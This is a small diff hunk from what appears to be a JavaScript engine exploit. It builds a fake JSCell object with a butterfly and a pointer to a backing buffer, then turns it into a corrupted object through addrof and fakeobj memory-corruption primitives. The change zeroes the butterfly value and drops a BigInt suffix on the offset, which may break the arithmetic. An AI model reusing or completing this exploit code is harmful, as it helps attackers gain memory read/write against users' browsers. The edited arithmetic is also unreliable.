@@ -62,12 +62,12 @@
 
       let fake = [
         i2f(0),                 // fake JSCell
-        i2f(0x0108200700000000n), // butterfly (can be 0)
+        i2f(0),                 // butterfly (can be 0)
         i2f(ab_addr),           // backing buffer
         i2f(0), i2f(0), i2f(0), i2f(0)
       ];
 
-      let fake_addr = addrof(fake) + 0x20n;
+      let fake_addr = addrof(fake) + 0x20;
       let corrupted = fakeobj(fake_addr);
 
       return {
